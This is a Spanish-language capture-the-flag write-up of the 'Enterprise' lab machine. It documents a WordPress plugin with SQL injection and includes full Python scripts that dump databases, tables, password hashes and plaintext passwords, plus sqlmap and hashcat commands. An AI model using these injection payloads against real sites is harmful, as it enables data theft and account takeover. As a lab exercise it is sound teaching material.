((Debian))|_http-generator: Joomla! - Open Source Content Management| http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION| http-robots. txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-server-header: Apache/2. 4. 10 (Debian)|_http-title: Home32812/tcp open unknown| fingerprint-strings: |  GenericLines, GetRequest, HTTPOptions: |   _______ _______ ______ _______|   |_____| |_____/ |______|   |_____ |_____ | | | _ ______||   Welcome to the Library Computer Access and Retrieval System|   Enter Bridge Access Code: |   Invalid Code|   Terminating Console|  NULL: |   _______ _______ ______ _______|   |_____| |_____/ |______|   |_____ |_____ | | | _ ______||   Welcome to the Library Computer Access and Retrieval System|_  Enter Bridge Access Code:1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port32812-TCP:V=7. 80%I=7%D=5/4%Time=60916018%P=x86_64-pc-linux-gnu%r(NUSF:LL,ED, \n\x20. . . . . . . . . Unknown service, doesn't matter for now. (Adem√°s me estaba dando problemas para la busqueda :P). . . . . . SF:minating\x20Console\n\n );Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue May 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 39. 93 secondsObtenemos estas versiones:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 4p1 Ubuntu 10       80   HTTP   Apache httpd 2. 4. 10       443   HTTPS   Apache httpd 2. 4. 25       8080   HTTP Proxy   Apache httpd 2. 4. 10       32812   -   Desconocido, pero parece un servidor web   Varias cositas web, demosle antonce‚Äô a ver por donde rompemos esta vaina ;) ‚Ä¶ Puerto 80 ‚åñ: Jmm, tenemos una p√°gina bastante linda, si vemos el c√≥digo fuente tenemos referencias hacia el dominio enterprise. htb, as√≠ que agregu√©moslo al archivo /etc/hosts, para que as√≠ cuando coloquemos el dominio en la web, nos resuelva como si estuvi√©ramos conect√°ndonos hacia la IP 10. 10. 10. 61.  M√°s info del archivo /etc/hosts. So: ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 61  enterprise. htb. . . Y ahora volviendo a probar en la web pero ahora contra el dominio: Ahora tenemos una p√°gina mucho m√°s bonita :) Veamos que podemos destacar‚Ä¶ En el c√≥digo fuente vemos varias cosillas:  http://enterprise. htb/wp-content/themes/twentyseventeen/style. css?ver=4. 8. 1,     donde podemos interpretar que el servicio web est√° hecho sobre WordPress (wp-*).    despu√©s podemos probar con los plugins que tenga instalado, ya que mucho son vulnerables‚Ä¶    http://enterprise. htb/?p=57,     podemos jugar con ese tipo de URL para fuzzear e intentar inyecci√≥n de algo.    Si entramos a cualquier post vemos un usuario para guardar:  william. riker. Para validar si estamos sobre WordPress podemos apoyarnos de la extensi√≥n Wappalyzer y jugando con varias URL mantenidas por WP: Bien, tenemos el portal login por default de WordPress al redireccionarnos a wp-admin/. Jugando con Wappalyzer nos indica que estamos ante la versi√≥n 4. 8. 1 de WP, adem√°s nos indica la versi√≥n PHP (5. 6. 31) y que la base de datos usada es MySQL‚Ä¶ Si colocamos el usuario william. riker en el campo Username con cualquier contrase√±a nos responde:  ERROR: The password you entered for the username william. riker is incorrect. Lost your password? Si por el contrario colocamos otro usuario el cual pensemos que no exista, nos responde: ERROR: Invalid username. Lost your password?, asi que sabemos que el usuario william. riker es v√°lido y existe ;) Jugando con bash intentamos ver que otros recursos est√°n disponibles mediante un secuenciador de 1 a 200 ante la URL que hab√≠amos encontrado antes que hacia referencia a los posts: ‚ù≠ for i in $(seq 1 200); do echo -n  Page $i:  ; curl -s -I http://enterprise. htb/?p=$i | grep HTTP; done. . . Page 13: HTTP/1. 1 301 Moved PermanentlyPage 14: HTTP/1. 1 301 Moved PermanentlyPage 15: HTTP/1. 1 301 Moved PermanentlyPage 16: HTTP/1. 1 301 Moved Permanently. . . Page 23: HTTP/1. 1 301 Moved PermanentlyPage 24: HTTP/1. 1 301 Moved Permanently. . . Page 51: HTTP/1. 1 200 OK. . . Page 53: HTTP/1. 1 200 OK. . . Page 55: HTTP/1. 1 200 OK. . . Page 57: HTTP/1. 1 200 OK. . . Page 69: HTTP/1. 1 200 OK. . . Page 71: HTTP/1. 1 301 Moved Permanently. . . Grepeando por titulo: ‚ù≠ for i in $(seq 1 100); do echo -n  Page $i - Status:  ; curl -s -I http://enterprise. htb/?p=$i | grep  HTTP/1  | awk '{print $2}'; echo -n   Titulo:  ; curl -s http://enterprise. htb/?p=$i | grep  &lt;title&gt; ; doneNo vemos nada raro. Pero viendo cada uno en la web no hay nada relevante‚Ä¶ Haciendo fuzzing tampoco encontramos nada, buscando vulnerabilidades relacionadas con WordPress 4. 8. 1 y a Apache 2. 4. 10 no vemos nada, asi que mov√°monos para otro puerto a vel khe. Puerto 443 ‚åñ: La p√°gina por default de Apache. Veamos si hay algo √∫til en el certificado SSL: ‚ù≠ openssl s_client -connect 10. 10. 10. 61:443CONNECTED(00000003). . . depth=0 C = UK, ST = United Federation of Planets, L = Earth, O = USS Enterprise, OU = Bridge, CN = enterprise. local, emailAddress = jeanlucpicard@enterprise. local. . . Bien, entre toda la info que nos muestra el certificado, principalmente podemos rescatar un dominio (enterprise. local) y una direcci√≥n email (jeanlucpicard@enterprise. local) (de la que podemos extraer el usuario jeanlucpicard. Agregu√©moslo por si algo. Si hacemos fuzzing encontramos un recurso llamativo: ‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common. txt https://enterprise. htb/FUZZ . . . =====================================================================ID      Response  Lines  Word    Chars    Payload=====================================================================000000012:  403    11 L   32 W    299 Ch    . htpasswd 000000011:  403    11 L   32 W    299 Ch    . htaccess 000000010:  403    11 L   32 W    294 Ch    . hta 000001755:  301    9 L   28 W    318 Ch    files 000002156:  200    375 L  964 W   10918 Ch   index. html 000003660:  403    11 L   32 W    303 Ch    server-status Tenemos la ruta files, si la visitamos obtenemos: Opa, un archivo . zip, pues descarguemoslo a ver que contiene‚Ä¶ ‚ù≠ unzip lcars. zip Archive: lcars. zip inflating: lcars/lcars_db. php inflating: lcars/lcars_dbpost. php inflating: lcars/lcars. phpVeamos cada uno de ellos: lcars/lcars. php&lt;?php/**   Plugin Name: lcars*   Plugin URI: enterprise. htb*   Description: Library Computer Access And Retrieval System*   Author: Geordi La Forge*   Version: 0. 2*   Author URI: enterprise. htb*               */// Need to create the user interface. // need to finsih the db interface// need to make it secure?&gt; Bien, nos informamos de un Plugin que aparentemente est√° siendo ejecutado por la m√°quina‚Ä¶ Jugando con el puerto 443 y el puerto 80, encontramos la ruta actual del Plugin, asi que vamos bien: ‚ù≠ curl -s -I http://enterprise. htb/wp-content/plugins/lcars/lcars. phpHTTP/1. 1 200 OKDate: Tue, 04 May 2021 25:25:25 GMTServer: Apache/2. 4. 10 (Debian)X-Powered-By: PHP/5. 6. 31Content-Type: text/html; charset=UTF-8lcars/lcars_db. php&lt;?phpinclude  /var/www/html/wp-config. php ;$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);// Test the connection:if (mysqli_connect_errno()){  // Connection Error  exit( Couldn't connect to the database:  . mysqli_connect_error());}// test to retireve an IDif (isset($_GET['query'])){  $query = $_GET['query'];  $sql =  SELECT ID FROM wp_posts WHERE post_name = $query ;  $result = $db-&gt;query($sql);  echo $result;} else {  echo  Failed to read query ;}?&gt; Opa, una conexi√≥n a la base de datos, pero lo interesante es que vemos como hace la petici√≥n ante ella al querer buscar el nombre del post (post_name) recibido mediante el par√°metro GET query. Validemos: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_db. phpFailed to read queryPerfecto, como vemos en el c√≥digo, si la variable query est√° vac√≠a, responde Failed to read query. ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=holaBien, hace la consulta a la base de datos, extrayendo el ID de la tabla wp_posts con respecto al nombre del post (en el anterior caso) llamado hola, como no existe, responde vac√≠o. Esto nos da una idea fuerte de que debemos explotar una inyecci√≥n SQL para leer usuarios o algo asi, veamos el otro archivo, pero ya tenemos algo para probar. lcars/lcars_dbpost. php&lt;?phpinclude  /var/www/html/wp-config. php ;$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);// Test the connection:if (mysqli_connect_errno()){  // Connection Error  exit( Couldn't connect to the database:  . mysqli_connect_error());}// test to retireve a post nameif (isset($_GET['query'])){  $query = (int)$_GET['query'];  $sql =  SELECT post_title FROM wp_posts WHERE ID = $query ;  $result = $db-&gt;query($sql);  if ($result){    $row = $result-&gt;fetch_row();    if (isset($row[0])){      echo $row[0];    }  }} else {  echo  Failed to read query ;}?&gt; De nuevo una consulta, solo que en este caso pasa el valor de query a entero. Extrae el titulo del post (post_title) de la tabla wp_posts donde ID ser√° igual al valor de query. Veamos: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_dbpost. phpFailed to read queryY: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_dbpost. php?query=1Hello world!‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_dbpost. php?query=2 ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_dbpost. php?query=holaCon esta consulta tambien podemos jugar a ver si podemos explotar alguna inyeccion SQL, a darle‚Ä¶ ‚Ä¶ Explotaci√≥n #: Como vimos antes, si hacemos una consulta hacia el recurso lcars_db. php vemos: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=a Nos responde, pero si hacemos la consulta con un numero, obtenemos: ‚ù≠ curl -s http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=1&lt;br /&gt;&lt;b&gt;Catchable fatal error&lt;/b&gt;: Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db. php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;Nos indica que el resultado no puede ser convertido a una cadena de caracteres. Jmm, ¬øser√° que nos podemos aprovechar de esto? Pues s√≠, podemos indicarle, si hay alg√∫n problema con la consulta hacia el ID 1, entonces hazme otra cosa, como por ejemplo demorar la respuesta X tiempo con la consulta SLEEP(&lt;tiempo&gt;), la tambi√©n llamada SQL injection - Time based. Entonces la petici√≥n quedar√≠a asi: http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=1 or sleep(2);# Con ;# le indicamos que todo lo que vaya despu√©s lo tome como comentarios. Si lo extrapolamos a como viajar√≠a la consulta hacia la base de datos, quedar√≠a asi: SELECT ID FROM wp_posts WHERE post_name = 1 or sleep(2);#; Como el nombre del post da error, ejecuta el sleep. Si ejecutamos en bash, tenemos: # URL encodeada‚ù≠ time curl -s  http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=1%20or%20sleep(2);# &lt;br /&gt;&lt;b&gt;Catchable fatal error&lt;/b&gt;: Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db. php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;real  1m25,973s. . . Se demora 1 minuto con 25 segundos (que es un mont√≥n, pero es porque por cada fila de la tabla hace el sleep), incluso al indicarle que simplemente se demorara 2 segundos m√°s‚Ä¶ Por lo tanto podemos jugar con el mismo SLEEP para indicarle milisegundos, a ver cuanto se demora en realidad: ‚ù≠ time curl -s  http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=2%20or%20sleep(0. 1);# &lt;br /&gt;&lt;b&gt;Catchable fatal error&lt;/b&gt;: Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db. php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;real  0m4,658s. . . Validamos de nuevo y asi nos aseguramos: ‚ù≠ time curl -s  http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=2%20or%20sleep(0. 1);# &lt;br /&gt;&lt;b&gt;Catchable fatal error&lt;/b&gt;: Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db. php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;real  0m4,657s. . . Bien, entonces con esto validamos una explotaci√≥n SQL basada en tiempo y tenemos una base para probar despu√©s, 4 segundos con SLEEP(0. 1). Creemos un script para jugar con las tablas y extraer info interesante: Explotacion SQL injection manual #:  Lindo recurso - MySQL SQL Injection Cheat Sheet. #!/usr/bin/python3import requestsimport stringimport signalimport timefrom pwn import *# Ctrl + Cdef def_handler(sig, frame):  print( \nInterrupci√≥n, saliendo. . . \n )  exit(1)signal. signal(signal. SIGINT, def_handler)url =  http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php result =   # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789! #$%&amp;'()*+,-. /:;&lt;=&gt;?@[\]^_`{|}~¬£set_chars = string. ascii_letters + string. digits + string. punctuation +  ¬£ session = requests. Session()# Hacemos de cuenta que hay 10 bases de datosp1 = log. progress( Extrayendo bases de datos )for db_position in range(0,10):  p2 = log. progress( DB [%d]  % (db_position))  # Recorremos cada base de datos y vamos descubriendo las letras que componen su nombre  for word_position in range(1,51):    # Iteramos entre cada letra del conjunto    for letter in set_chars:      # Tiempo antes de la petici√≥n      time_before = time. time()      payload =  IF(Ascii(substring((SELECT schema_name FROM information_schema. schemata LIMIT %d,1),%d,1))=%d,sleep(0. 1),0)  % (db_position, word_position, ord(letter))      p1. status(payload)      data_get = { query  :  1 or   + payload}      r = session. get(url, params=data_get)      # Tiempo despues de la petici√≥n      time_after = time. time()      # Si la diferencia de tiempos es mayor a 3 (recuerden que 0. 1 era igual a 4 segundos) sabemos que ejecuto el SLEEP,      # por lo tanto sabemos que esa letra hace parte de la respuesta      if time_after - time_before &gt; 3:        result += letter        p2. status(result)        break      # Si llega a este caracter, quiere decir que ya termino la palabra actual y va a la siguiente.       elif letter ==  ¬£ :        break    if letter ==  ¬£ :      break  p2. success(result)  result =   p1. success( d0Ne )print( \nk3Ep br3ak1n6 4anYyyu. . . \n )En la ejecuci√≥n tenemos: ‚ù≠ python3 ex_db_name. py [+] Extrayendo bases de datos: d0Ne[+] DB [0]: information_schema[+] DB [1]: joomla[+] DB [2]: joomladb[+] DB [3]: mysql[+] DB [4]: performance_schema[+] DB [5]: sys[+] DB [6]: wordpress[+] DB [7]: wordpressdb[+] DB [8][+] DB [9]k3Ep br3ak1n6 4anYyyu. . . Opa, tenemos 8 bases de datos üò¨ Veamos primero las relacionadas con WordPress SQL injection - Columnas WordPress DB: Ac√° estuve bastante rato atascado intentando cosas, ya que los payloads que hab√≠a usado de explotaciones pasadas no me estaban funcionando, ni siquiera el payload ‚Äúobvio‚Äù que deber√≠a ir despu√©s de encontrar las bases de datos: # Esta deberia ser la siguiente en explotar:payload =  1 or IF(Ascii(substring((SELECT table_name FROM information_schema. tables WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d,sleep(0. 1),0);-- -  % (table_position, word_position, ord(letter))# O de esta forma (que si la usamos para descubrir las bases de datos funciona):payload =  1 or (SELECT (CASE WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(table_name AS NCHAR),0x20))  payload +=  FROM INFORMATION_SCHEMA. TABLES WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d)   % (table_position, word_position, ord(letter))payload +=  THEN 1 ELSE (SELECT 2 UNION SELECT 3) END)) Pero nada, siempre obten√≠amos una respuesta en blanco :( Tuve que decantarme por ver como hacia sqlmap las peticiones y desde ah√≠ usar la sentencia para jugar, al ejecutar la instrucci√≥n (de abajo) podemos ver la siguiente sentencia SQL que hace para extraer nombres de tablas: ‚ù≠ sqlmap -u http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php?query=1 -D wordpress --tables -v6 Le indicamos la URL vulnerable, que tome la base de datos llamada WordPress, nos dumpee las tablas y que el verbose sea m√°ximo, asi tenemos claridad de los payloads y cositas que usa. Encontramos esta sentencia: (Le cambio algunas cositas para que sea m√°s intuitiva) (  SELECT 8350 FROM(    SELECT COUNT(*),CONCAT(      0x41,(        SELECT MID(          (            IFNULL(              CAST(                table_name AS NCHAR              ),0x20            )          ),1,50        ) FROM INFORMATION_SCHEMA. TABLES WHERE table_schema IN (0x4242) LIMIT 0,1      ),0x43,FLOOR(RAND(0)*2)    )x FROM INFORMATION_SCHEMA. PLUGINS GROUP BY x  )z)Hace un substring (MID) del nombre de la tabla (50 posiciones por si algo) encontrada (IN) en la base de datos BB (0x4242 en hexadecimal), esa tabla la concatena (CONCAT) con 3 valores m√°s: A (0x41 hex), C (0x41 hex) y un n√∫mero random (RAND) jugando con el entero m√°s grande (FLOOR). El resultado (la tabla, por ejemplo: Aclaroquesi_tableC) viene concatenada en varios valores, esto para generar algunos errores y agruparlos (: Es medio rara de entender, pero cada vez que la lees se vuelve m√°s f√°cil. Listo, pues apoy√©monos de esta sentencia para extraer las tablas de las bases de datos anteriores: SQL injection - Tablas: #!/usr/bin/python3import requestsimport stringimport signalimport timeimport sysimport refrom pwn import *# Ctrl + Cdef def_handler(sig, frame):  print( \nInterrupci√≥n, saliendo. . . \n )  exit(1)signal. signal(signal. SIGINT, def_handler)if len(sys. argv) != 2:             print( \n[!] Usage: python3   + sys. argv[0] +   &lt;database&gt;\n )  exit(0)url =  http://enterprise. htb/wp-content/plugins/lcars/lcars_db. php result =   # Recibimos como argumento la base de datos y la convertimos a hexadecimalsession = requests. Session()db_name = sys. argv[1]db_name_hex = db_name. encode('utf-8'). hex()p1 = log. progress( Extrayendo tablas de la base de datos %s  % (db_name))p2 = log. progress( Payload )# En el caso de que existan 100 tablasfor table_position in range(0,100):  # 0x5441424C45 = TABLE  # 0x%s = El nombre de la base de datos en hexadecimal  ## Resultado: i. e -&gt; TABLEestaeslatablaTABLE  payload =  (SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,50) FROM    payload +=  INFORMATION_SCHEMA. TABLES WHERE table_schema IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x   % (db_name_hex, table_position)  payload +=  FROM INFORMATION_SCHEMA. PLUGINS GROUP BY x)nada)   data_get = { query  :  1 or   + payload}  p2. status(data_get[ query ])  r = session. get(url, params=data_get)  if  Duplicate  not in r. text:    break  p3 = log. progress( Tabla [%d]  % (table_position))  # Tomamos el resultado y extraermos lo que este entre la E (e final de TABLE) y la T (t inicial de TABLE), esa seria la tabla.   result += re. findall(r'E(. *?)T', r. text)[0]  p3. success(result)  result =   p1. success( d0Ne )p2. success( d0Ne )print( \nk3Ep br3ak1n6 4anYyyu. . . \n )Ahora si, probemos con la base de datos wordpress: ‚ù≠ python3 ex_tables. py wordpress[+] Extrayendo tablas de la base de datos wordpress: d0Ne[+] Payload: d0Ne[+] Tabla [0]: wp_commentmeta[+] Tabla [1]: wp_comments[+] Tabla [2]: wp_links[+] Tabla [3]: wp_options[+] Tabla [4]: wp_postmeta[+] Tabla [5]: wp_posts[+] Tabla [6]: wp_term_relationships[+] Tabla [7]: wp_term_taxonomy[+] Tabla [8]: wp_termmeta[+] Tabla [9]: wp_terms[+] Tabla [10]: wp_usermeta[+] Tabla [11]: wp_usersk3Ep br3ak1n6 4anYyyu. . . Bien, 12 tablas, juguemos con el script para extraer columnas de las tablas: SQL injection - Columnas wordpress DB: . . . table_name = sys. argv[2]table_name_hex = table_name. encode('utf-8'). hex(). . .   payload =  (SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,50) FROM INFORMATION_SCHEMA. COLUMNS    payload +=  WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x   % (db_name_hex, table_name_hex, table_position)  payload +=  FROM INFORMATION_SCHEMA. PLUGINS GROUP BY x)nada) . . . Le indicamos que ahora tome en otro parametro la tabla a fuzzear, ejecutandolo contra la tabla wp_users, tenemos: ‚ù≠ python3 ex_colums. py wordpress wp_users[+] Extrayendo columnas de la tabla wp_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] Columna [0]: ID[+] Columna [1]: user_login[+] Columna [2]: user_pass[+] Columna [3]: user_nicename[+] Columna [4]: user_email[+] Columna [5]: user_url[+] Columna [6]: user_registered[+] Columna [7]: user_activation_key[+] Columna [8]: user_status[+] Columna [9]: display_namek3Ep br3ak1n6 4anYyyu. . . SQL injection - Info columnas: Perfecto, veamos la data que hay en la columna user_login y user_pass: . . . db_name = sys. argv[1]table_name = sys. argv[2]column_name = sys. argv[3]. . .   # Debemos agrandar el substring, ya que pueda que nos encontremos unos hashes y pueden ser largos, ahora la extraccion es: Edata_de_la_tablaT  payload =  (SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x45,(SELECT MID((IFNULL(CAST(%s AS NCHAR),0x20)),1,80) FROM %s. %s   % (column_name, db_name, table_name)  payload +=  LIMIT %d,1),0x54,FLOOR(RAND(0)*2))x   % (table_position)  payload +=  FROM INFORMATION_SCHEMA. PLUGINS GROUP BY x)nada) . . . ‚ù≠ python3 ex_information. py wp_users user_login[+] Info columna user_login - tabla wp_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] [0]: william. rikerk3Ep br3ak1n6 4anYyyu. . . ‚ù≠ python3 ex_information. py wp_users user_pass[+] Info columna user_pass - tabla wp_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] [0]: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q. 2. k3Ep br3ak1n6 4anYyyu. . . Solo hay un registro, el usuario william. riker (que hab√≠amos descubierto antes) y la contrase√±a encriptada $P$BFf47EOgXrJB3ozBRZkjYcleng2Q. 2. ‚Ä¶ Perfecto, pues antes de seguir con las dem√°s bases de datos, intentemos crackear ese hash, lo guardamos en un archivo y ejecutamos john o hashcat:  Example hashes - Wiki Hashcat. ‚ù≠ john --wordlist=/usr/share/wordlists/rockyou. txt william_hash Pero se queda un bueeeeeen rato intentando crackear el hash, hasta llegar al final del archivo e indicarnos que no ha sido crackeado :( Entonces sigamos profundizando entre las otras bases de datos. ‚Ä¶ Creamos un script (completo y con varios cambios) que contenga todas las extracciones, asi es muuuucho m√°s f√°cil de movernos entre bases de datos, tablas y columnas ;P  ex_all. py ‚Ä¶ Veamos la base de datos joomla: ‚ù≠ python3 ex_all. py joomla[+] Extrayendo tablas de la base de datos joomla: d0Ne[+] Payload: d0Ne------------------------------------------¬∑Est√° vac√≠a, juguemos entonces con la base de datos joomladb (que si revisamos nuestro escaneo de nmap, nos indicaba que el puerto 8080 est√° sirviendo un CMS Joomla): ‚ù≠ python3 ex_all. py joomladb [+] Extrayendo tablas de la base de datos joomladb: d0Ne[+] Payload: d0Ne------------------------------------------¬∑ [+] Tabla [0]: edz2g_assets         . . . . . . . . . [+] Tabla [69]: edz2g_users[+] Tabla [70]: edz2g_utf8_conversion[+] Tabla [71]: edz2g_viewlevelsBien, enumeremos la tabla edz2g_users: ‚ù≠ python3 ex_all. py joomladb edz2g_users[+] Extrayendo columnas de la tabla edz2g_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] Columna [0]: id[+] Columna [1]: name[+] Columna [2]: username[+] Columna [3]: email[+] Columna [4]: password[+] Columna [5]: block[+] Columna [6]: sendEmail[+] Columna [7]: registerDate[+] Columna [8]: lastvisitDate[+] Columna [9]: activation[+] Columna [10]: params[+] Columna [11]: lastReset[+] Columna [12]: resetCount[+] Columna [13]: otpKey[+] Columna [14]: otep[+] Columna [15]: requireResetVeamos la data de los campos username y password: ‚ù≠ python3 ex_all. py joomladb edz2g_users username[+] Info columna username - tabla edz2g_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] [0]: geordi. la. forge[+] [1]: Guinank3Ep br3ak1n6 4anYyyu. . . ‚ù≠ python3 ex_all. py joomladb edz2g_users password[+] Info columna password - tabla edz2g_users: d0Ne[+] Payload: d0Ne------------------------------------------¬∑[+] [0]: $2y$10$cXSgEkNQGBBUneDKXq9gU. 8RAf37GyN7JIrPE7us9UBMR9uDDKaWy[+] [1]: $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2qk3Ep br3ak1n6 4anYyyu. . . Opa 2 usuarios con credenciales: * geordi. la. forge:$2y$10$cXSgEkNQGBBUneDKXq9gU. 8RAf37GyN7JIrPE7us9UBMR9uDDKaWy. * Guinan:$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q. Bien, pues volvamos a intentar crackear, pero ahora estos hashes: ‚ù≠ strings joomla_hashes $2y$10$cXSgEkNQGBBUneDKXq9gU. 8RAf37GyN7JIrPE7us9UBMR9uDDKaWy$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2qPara cambiar, usemos hashcat: ‚ù≠ hashcat -m 3200 -a 0 -o cracked. txt joomla_hashes /usr/share/wordlists/rockyou. txt. . .  -m: Le indicamos el tipo de hash, 3200 hace referencia a bcrypt.  -a: Con 0, le decimos que el ataque es tipo diccionario.  -o: El resultado crackeado nos lo guarda en el archivo craced. txt.  Pasamos archivo de hashes.  Pasamos diccionario a usar.  Unlike the other hash algorithms we‚Äôve encountered so far bcrypt is specifically designed to be slow to crack, especially for GPUs. Crack The Hash - TryHackMe. Y s√≠, es demasiado demorado (18 d√≠as üò± +-), dej√©moslo un rato y mientras tanto enumeremos el puerto 8080. ‚Ä¶ Puerto 8080 ‚åñ: Bien, una p√°gina web normal, con algunas referencias extra√±as, tambi√©n al final vemos un panel login, pero no podemos hacer mucho con √©l a pesar de tener usuarios v√°lidos (presuntamente), ya que no tenemos contrase√±as a√∫n‚Ä¶ Profundizando (y de nuevo, recordando el escaneo con nmap), vemos que est√° siendo soportada por el gestor de contenido (CMS) Joomla, que b√°sicamente es una herramienta para la creaci√≥n de sitios web.  ¬øQu√© es Joomla?. Enumerando tambi√©n nos damos cuenta de que tiene disponible el recurso robots. txt: Bien, varios apartados, veamos administrator/: Otro panel de logeo, pero igual, jugando no logramos nada :( A este punto hab√≠an pasado varios minutos y nada con respecto al crackeo, asi que cancel√°ndolo y probando otras cositas como estas (e. e) obtenemos:  Crear un diccionario basado en el contenido de las webs: curl &gt; html2text &gt; hashcat/john. Nada, seguimos sin resultados.  Tomar el anterior diccionario, pero ahora agregarle reglas, les dejo un post donde las explican. Pero despu√©s de jugar seguimos igual :(     Dictionary attack with rules - Hashcat.    (Mejor dos recursos, este est√° buen√≠simo) One Rule to Rule Them All.     Tomar los nombres de los usuarios (como son medio extra√±os) crear un diccionario que los contenga y volver a jugar con las reglas‚Ä¶ Nada :(Otras cositas que intentamos, pero contra la web fueron:  Fuzzear entre algunos de los directorios anteriores, pero no encontramos nada interesante.  Buscar de alguna forma la versi√≥n del Joomla, ac√° encontramos que en la ruta administrator/manifests/files/joomla. xml se puede visualizar, y si: Buscando las vulnerabilidades relacionadas vemos algunas, pero no obtenemos nada de ellas :( ‚Ä¶ Despu√©s de un rato jugando con las bases de datos y sus tablas, encontramos esto en la tabla wp_posts (donde est√°n los posts del sitio): ‚ù≠ python3 ex_all. py wordpress[+] Extrayendo tablas de la base de datos wordpress: d0Ne[+] Payload: d0Ne. . . [+] Tabla [5]: wp_posts. . . ‚ù≠ python3 ex_all. py wordpress wp_posts[+] Extrayendo columnas de la tabla wp_posts: d0Ne[+] Payload: d0Ne. . . [+] Columna [4]: post_content[+] Columna [5]: post_title. . . ‚ù≠ python3 ex_all. py wordpress wp_posts post_status[+] Info columna post_title - tabla wp_posts: d0Ne[+] Payload: d0Ne. . . [+] [34]: Stardate 55132. 2[+] [35]: Passwords [+] [36]: Passwords[+] [37]: Passwords[+] [38]: YAYAYAYAY. . . . Vemos 2 posts conocidos, pero 3 con un nombre bastante llamativo y que no vimos en nuestro reconocimiento web‚Ä¶ Enfoqu√©monos en las filas 35, 36 y 37. Echemos un ojo a su contenido: ‚ù≠ python3 ex_all. py wordpress wp_posts post_content[+] Info columna post_content - tabla wp_posts: d0Ne[+] Payload: d0Ne. . . [+] [35]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;[+] [36]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;[+] [37]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;. . . What jjaja, que loco esto, en el lugar menos pensado vemos lo que parecen ser unas contrase√±as (y el post lo dice tambien :P): * ZxJyhGem4k338S2Y* enterprisencc170* ZD3YxfnSjezg67JZ* u*Z14ru0p#ttj83zS6Jmm, pues viendo quien creo esos posts (columna post_author) obtenemos el ID 1, si vemos la tabla wp_users y jugamos con el campo ID y user_login, vemos que el ID:1 hace referencia a william. riker, asi que √©l fue el que puso esas contrase√±as en el post, por lo que probablemente alguna de ellas nos sirva para entrar con su cuenta en el panel login de WordPress, validemos: ‚Ä¶ WordPress login done: Probando con william. riker:u*Z14ru0p#ttj83zS6 logramos entrar :) Perfectoooo, tamos dentro 